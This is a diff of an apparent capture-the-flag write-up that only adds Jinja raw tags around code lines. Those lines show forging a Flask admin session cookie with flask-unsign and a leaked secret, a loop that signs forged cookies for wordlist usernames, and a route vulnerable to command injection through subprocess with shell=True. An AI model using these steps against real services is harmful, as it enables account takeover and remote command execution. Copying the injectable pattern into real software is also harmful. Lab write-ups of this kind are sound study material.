@@ -76,7 +76,7 @@ flask-unsign --unsign --cookie 'eyJsb2dnZWRfaW4iOnRydWUsInVzZXJuYW1lIjoiZWVlZSJ9
 
 With the secret we can craft any cookie we want, let's hope there is an admin account:  
 ```
-flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123'
+{% raw %} flask-unsign --sign --cookie "{'logged_in': True, 'username': 'admin'}" --secret 'secret123' {% endraw %}
 ```
 Now I'll replace the cookie with newly created one in devtools.  
 Unfortunately it didn't work.  
@@ -95,7 +95,7 @@ secret_key = 'secret123'
 with open(wordlist_path, 'r') as file:
     for user in file:
         user = user.strip()
-        cookie_data = f"{{'logged_in': True, 'username': '{user}'}}"
+{% raw %} cookie_data = f"{{'logged_in': True, 'username': '{user}'}}" {% endraw %}
         cmd = [
             'flask-unsign',
             '--sign',
@@ -190,10 +190,10 @@ def export_note_remote():
                 try:
                     r = pyrequest.get(url,allow_redirects=True)
                     rand_int = random.randint(1,10000)
-                    command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
+       {% raw %}             command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}" {% endraw %}
                     subprocess.run(command, shell=True, executable="/bin/bash")
 
-                    if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):
+          {% raw %}     if os.path.isfile(attachment_dir + f'{str(rand_int)}.pdf'):  {% endraw %}
 
                         return send_file(attachment_dir + f'{str(rand_int)}.pdf', as_attachment=True)
 
@@ -205,10 +205,10 @@ def export_note_remote():
 
 
             else:
-                return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")
+{% raw %}           return render_template('export_note.html', error=f"Error occured while exporting ! ({error})")  {% endraw %}
             
         except Exception as e:
-            return render_template('export_note.html', error=f"Error occured while exporting ! ({e})")
+{% raw %}           return render_template('export_note.html', error=f"Error occured while exporting ! ({e})") {% endraw %}
 
     else:
         abort(403)
@@ -218,8 +218,8 @@ def export_note_remote():
 
 ```python
 r = pyrequest.get(url,allow_redirects=True)
-rand_int = random.randint(1,10000)
-command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}"
+rand_int = random.randint(1,10000) {% raw %}
+command = f"node misc/md-to-pdf.js  $'{r.text.strip()}' {rand_int}" {% endraw %}
 subprocess.run(command, shell=True, executable="/bin/bash")
 ```
 
